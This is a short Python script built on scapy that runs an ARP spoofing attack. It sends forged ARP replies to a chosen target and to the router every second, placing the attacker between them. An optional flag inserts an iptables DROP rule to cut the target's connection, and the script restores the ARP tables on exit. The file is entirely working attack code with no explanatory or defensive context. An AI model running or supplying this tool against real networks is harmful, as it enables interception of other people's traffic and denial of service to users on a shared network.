import scapy.all as scapy
import time
import argparse
import os

parser = argparse.ArgumentParser()
parser.add_argument("target")
parser.add_argument("-r", "--rooter" ,help="Type the rooter adress to spoof",default="192.168.1.254")
parser.add_argument("-d", "--drop", help="Cut connection of user 1 for cut 0 for not")
args = parser.parse_args()
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
      
def drop_packets(target_ip):
    print("Setting up Iptables rules ...\n")
    os.system(f"sudo iptables -I INPUT -s {target_ip} -j DROP")

def restore_iptable(target_ip):
    print("\n \nRestoring Iptables")
    os.system(f"sudo iptables -D INPUT -s {target_ip} -j DROP")

target_ip = args.target

gateway_ip = args.rooter

if (args.drop):
    drop_packets(target_ip)
    time.sleep(2)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(1)
  
except KeyboardInterrupt:
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    if (args.drop):
        restore_iptable(target_ip)
    print("\n[+] Arp Spoof Stopped")
